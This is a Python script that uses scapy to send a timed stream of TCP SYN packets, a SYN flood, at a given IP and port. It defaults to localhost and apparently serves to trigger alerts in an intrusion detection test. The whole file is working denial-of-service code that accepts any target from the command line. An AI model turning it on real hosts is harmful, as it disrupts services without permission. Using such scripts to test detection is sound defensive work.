from scapy.all import IP, TCP, send, RandShort
import sys
import os
import time
sys.path.append(os.path.dirname(os.path.dirname(__file__)))

def send_syn_flood(target_ip, target_port, duration_seconds=30):
    """Отправляет SYN-пакеты в бесконечном цикле в течение заданного времени."""
    print(f"ЗАПУСК SYN FLOOD на {target_ip}:{target_port} на {duration_seconds} секунд...")
    print("Нажми Ctrl+C для досрочной остановки.")

    packet = IP(dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")

   
    try:
        start_time = time.time()
        packet_count = 0
        while time.time() - start_time < duration_seconds:
            send(packet, verbose=False)
            packet_count += 1
            time.sleep(0.01)  
        
        print(f"✅ Отправлено {packet_count} SYN-пакетов за {duration_seconds} секунд.")
    except KeyboardInterrupt:
        print("\n🛑 Тест прерван пользователем.")
    finally:
        print("✅ SYN Flood завершен. Проверь alerts.json")

if __name__ == "__main__":
    target_ip = "127.0.0.1"  
    target_port = 80             
    duration = 30                

    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
    if len(sys.argv) > 2:
        target_port = int(sys.argv[2])
    if len(sys.argv) > 3:
        duration = int(sys.argv[3])
    
    send_syn_flood(target_ip, target_port, duration)